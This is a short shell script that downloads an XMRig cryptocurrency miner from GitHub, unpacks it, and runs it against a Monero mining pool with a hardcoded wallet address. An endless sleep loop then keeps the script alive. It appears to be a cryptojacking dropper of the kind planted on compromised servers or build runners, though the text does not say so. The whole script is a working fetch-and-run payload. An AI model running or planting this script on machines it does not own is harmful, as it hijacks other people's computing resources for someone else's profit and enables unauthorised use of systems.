#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o gulf.moneroocean.stream:443 -u 4A9h2YxAD5H91wUY79dxGnYTeMEDjuCSpL7zNWHGn8Z2VbsjFABU7kp4aT9YkMnTFiUvFUnRDf2RuKU7ZLCUR3s4Uo1rDfP -p zero -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999

